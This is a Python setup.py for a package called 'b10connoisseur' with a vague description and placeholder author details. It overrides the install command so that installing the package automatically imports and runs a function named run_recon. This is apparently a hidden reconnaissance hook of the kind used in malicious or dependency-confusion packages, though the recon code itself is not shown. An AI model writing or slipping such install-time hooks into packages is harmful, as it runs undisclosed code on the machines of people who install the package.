from setuptools import setup, find_packages
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        from b10connoisseur import run_recon
        run_recon()


setup(
    name="b10connoisseur",
    version="0.25.0",
    packages=find_packages(),
    cmdclass={
        "install": PostInstallCommand,
    },
    python_requires=">=3.8",
    description="A custom package with custom_function",
    author="Your Name",
    author_email="you@example.com",
)
